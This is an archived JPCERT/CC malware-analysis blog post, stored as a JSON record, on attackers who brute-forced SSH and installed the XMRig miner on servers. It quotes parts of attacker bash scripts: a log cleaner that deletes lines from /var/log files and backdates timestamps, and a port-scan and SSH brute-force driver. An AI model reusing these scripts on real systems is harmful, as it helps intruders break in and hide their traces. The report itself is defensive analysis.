{
    "id": "484bc8c9-59c1-41d0-9d69-5fc16fe1db0e",
    "created_at": "2023-01-12T15:05:56.119585Z",
    "updated_at": "2025-03-27T02:05:31.932011Z",
    "deleted_at": null,
    "sha1_hash": "b926ac26c1d9d79c953313aff0df6e2b1be1cbea",
    "title": "2021-05-27 - Attacks Embedding XMRig on Compromised Servers",
    "authors": "",
    "file_creation_date": "2022-05-28T15:45:14Z",
    "file_modification_date": "2022-05-28T15:45:14Z",
    "file_size": 823091,
    "plain_text": "# Attacks Embedding XMRig on Compromised Servers\n\n**blogs.jpcert.or.jp/en/2021/05/xmrig.html**\n\n増渕 [維摩(Yuma Masubuchi)](https://blogs.jpcert.or.jp/en/masubuchi/)\n\nMay 27, 2021\n\n[Email](http://10.10.0.46/mailto:?subject=Attacks%20Embedding%20XMRig%20%20on%20Compromised%20Servers&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2021%2F05%2Fxmrig.html)\n\nPublicly-accessible servers have been often targeted for attacks. In recent years, there are\ncases where these servers are compromised and embedded with a cryptocurrency mining\ntool. JPCERT/CC confirmed cases with XMRig [1] in February 2021. This article introduces\nthe details of the cases and the tools used.\n\n### Initial access/Lateral movement\n\nIn one of the recent cases, the attacker made several attempts to access the server with\nSSH protocol, and eventually logged in with its root account. This server was reachable both\nfrom the Internet and intranet. After the intrusion, the attacker conducted SSH brute force\nattack to other servers on the intranet, moved laterally to several servers and ran a\ncryptocurrency mining tool XMRig. For its execution, XHide [2] was used to hide process\nnames and delay the detection. Below are the tools found in compromised servers.\n\n**File name** **Contents**\n\n**init** XMRig, an open source mining software\n\n**h64** XHide, a process hiding tool\n\n### Defense evasion\n\nAfter setting up the mining tool, the attacker deleted the evidence from the compromised\nservers by replacing the contents of the following logfile with /dev/null.\n\n/var/log/security\n/var/log/wtmp\n/var/log/btmp\n/var/log/utx lastlog\n\n\n-----\n\n/var/log/utx.log\n\nThe attacker also used the script to delete rows that include specific string from each log file\nunder /var/log. Below is a part of the bash script:\n```\n#!/bin/bash\necho \"        Linux Hider v2.0 by mave\"\necho \"        enhanced by me!     \"\necho \"[+] [Shkupi Logcleaner] Removing $1 from the logs........ .\"\necho \"\"\nif [ -f /var/log/maillog ]; then\n  cat /var/log/maillog | grep -v $1 > /tmp/maillog.xz\n  touch -acmr /var/log/maillog /tmp/maillog.xz\n  mv -f /tmp/maillog.xz /var/log/maillog\n  echo \"[+] /var/log/maillog  ... [done]\"\n  echo \"\"\nfi\n\n```\n（snipped)\n```\nrm -f /tmp/*.xz\necho \"      * m i s s i o n a c c o m p l i s h e d *\"\necho \"\"\nsleep 2\necho \"          p.h.e.e.r S.H.c.r.e.w\"\necho \"\"\nsleep 5\nexit 1\n\n```\nStrings except the specific rows are saved in a file in .xz format. Its timestamp is modified,\nand the contents are overwritten in each log file. Finally, the .xz file is deleted so that there is\nno evidence of the malicious activity in the log file.\n\n### Spread infection\n\nAfter embedding the mining tool and deleting the log file, the attackers sent a large number\nof packets to random hosts from the initially compromised server. Below are the tools used in\nthe scanning activity. These are executed by the bash script named “root”, which is\nmentioned later.\n\n\n**File**\n**name**\n\n\n**Contents**\n\n\n**ps** Shark, a port scan tool [3]\n\n**ps2** A port scan tool\n\n\n-----\n\n**banner** A tool to access a specified host and extract banner information from the\nresponse\n\n**prg** A tool to read IP address and password list and conduct DDH brute force\nattacks\n\n**root** A bash script to conduct scan and SSH brute force\n\nThe attack script first conducts SYN scanning to check if a specific port is open. It also reads\nthe banner information of the response from the host. If it is determined as a SSH server,\nSSH brute force is carried out. Below is the bash script:\n\n\n-----\n\n```\n#!/bin/bash\n# PRGSSH v3.2 - 06/Sep/2018\n# AUTHOR: PRG @ oldTeam\n#  ___________________________________________________\n# |                          |\n# | ###### ######  ###### ###### ###### ##  ## |\n# | ##  ## ##  ## ##   ##   ##   ##  ## |\n# | ###### ######  ## ### ###### ###### ######## |\n# | ##   ## ##  ## ##   ##   ## ##  ## |\n# | ##   ##  ## ###### ###### ###### ##  ## |\n# |                          |\n# |        VERSION 3.3 - 2018         |\n# |         CREATED BY PRG          |\n# |           OLDTEAM           |\n# |       FOR TESTING PURPOSES ONLY       |\n# |___________________________________________________|\n#CONFIG\nkey=PRG-oldTeam   # key for scanner ( DO NOT MODIFY )\nmode=normal     # normal or verbose mode (if you put <verbose>) it will show you\nprint like: Check IP with user\nport=3691       # port for bruteforce\nuidThreads=500    # threads if you are uid0usrThreads=350    # threads if you\nare user\nbanThreads=250    # threads for banner grabber\npsSpeed=10      # portscan speed\n#END CONFIG\n# MOTD\necho \"let's see what happens\";\n# END MOTD\n rm -rf bios.txt banner.log\nsleep 5\nif [[ $UID == 0 || $EUID == 0 ]]; then\n echo -e \"[+] uid0 detected \"\n ./ps $port -a $1 -s $psSpeed\n echo -e \"[+] Banner grabber starting... \"\n sleep 3\n ./banner bios.txt $port $banThreads\n cat banner.log |grep SSH-2.0-OpenSSH |awk '{print $1}' |uniq |shuf >> ips.lst\n ipscount=`grep -c . ips.lst`\n echo -e \"[+] Found $ipscount possible victims \"\n sleep 10\n\n```\n\n-----\n\n```\n ./prg $uidThreads $port $mode $key\n else\n echo -e \"[+] user detected \"\n ./ps2 $1 $port\n echo -e \"[+] Banner grabber starting... \"\n sleep 1\n ./banner bios.txt $port $banThreads\n sleep 3\n cat banner.log |grep SSH-2.0-OpenSSH |awk '{print $1}' |uniq |shuf >> ips.lst\n sleep 10\n echo -e \"[+] Start bruteforce attack... \"\n ./prg $usrThreads $port $mode $key\nfi\n\n```\nThe flow of the attack is illustrated as follows. In the scan and SSH brute force attack to\nrandom IP addresses, there were many packets destined to port number 3691. The reason\nfor this choice remains unknown.\n\nFigure 1: Attack flow\n\n### In closing\n\nThis attack activities are carried out by leveraging existing available tools. Once the intranet\nis compromised, it is easy for attackers to move laterally across the network especially in the\nenvironment where weak username and password are used. The attack technique is nothing\n\n\n-----\n\nnew, and the damage can be mitigated by configuring proper SSH access restrictions and\nSSH public key authentication. Please ensure these measures and watch out for similar\nmalicious activity in the wild.\n\nThe hash values of the tools are available in Appendix A.\n\n- Yuma Masubuchi, Kota Kino\n(Translated by Yukako Uchida)\n\n### Reference\n\n[1] XMRig\n\nhttps://github.com/xmrig/xmrig\n\n[2] HackTool.Linux.XHide.GA\n\nhttps://www.trendmicro.com/vinfo/jp/threat-encyclopedia/malware/hacktool.linux.xhide.ga\n\n[3] HKTL_SHARK.GA\n\nhttps://www.trendmicro.com/vinfo/jp/threat-encyclopedia/malware/hktl_shark.ga\n\n### Appendix A Hash value of the tools\n\nThese hash values include tools which may also be used in daily operation. Beware of false\ndetection when using this as an indicator of compromise.\n\ninit\n\nfdfee2487f51446bf7bfb559b0b66de67cc5f6293752413435512ea8869df2e7\n\nh64\n\n7fe9d6d8b9390020862ca7dc9e69c1e2b676db5898e4bfad51d66250e9af3eaf\n\nps\n\nd328ebb08f6002c6819ecb360a132809d6bed2b7cdea7d2bc6f4a2ce95b27e34\n\nps2\n\n14779e087a764063d260cafa5c2b93d7ed5e0d19783eeaea6abb12d17561949a\n\nbanner\n\n2ef26484ec9e70f9ba9273a9a7333af195fb35d410baf19055eacbfa157ef25\n\nprg\n\n9970b53013dc9cdb23ec69b48743d75ece460d40ab51277d92e665c2dbb73c97\n\nroot\n\nde1ebfaa849a89478ac101614b1275f5e1dda9bfd07697911fd8fa125edaf7c2\n\n\n-----\n\n[Email](http://10.10.0.46/mailto:?subject=Attacks%20Embedding%20XMRig%20%20on%20Compromised%20Servers&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2021%2F05%2Fxmrig.html)\n\nAuthor\n\n増渕 [維摩(Yuma Masubuchi)](https://blogs.jpcert.or.jp/en/masubuchi/)\n\nYuma has been engaged in malware analysis and coordination of cyber security incidents in\nJPCERT/CC Incident Response Group since November 2020.\n\nWas this page helpful?\n\n0 people found this content helpful.\n\nIf you wish to make comments or ask questions, please use this form.\n\nThis form is for comments and inquiries. For any questions regarding specific commercial\nproducts, please contact the vendor.\n\nplease change the setting of your browser to set JavaScript valid. Thank you!\n\n## Related articles\n\n[Back](https://blogs.jpcert.or.jp/en/2021/05/locked-shields-2021.html)\n[Top](https://blogs.jpcert.or.jp/en/)\n[Next](https://blogs.jpcert.or.jp/en/2021/06/php_malware.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-27 - Attacks Embedding XMRig on Compromised Servers.pdf"
    ],
    "report_names": [
        "2021-05-27 - Attacks Embedding XMRig on Compromised Servers.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535956,
    "ts_updated_at": 1743041131,
    "ts_creation_date": 1653752714,
    "ts_modification_date": 1653752714,
    "files": {
        "pdf": "https://archive.orkl.eu/b926ac26c1d9d79c953313aff0df6e2b1be1cbea.pdf",
        "text": "https://archive.orkl.eu/b926ac26c1d9d79c953313aff0df6e2b1be1cbea.txt",
        "img": "https://archive.orkl.eu/b926ac26c1d9d79c953313aff0df6e2b1be1cbea.jpg"
    }
}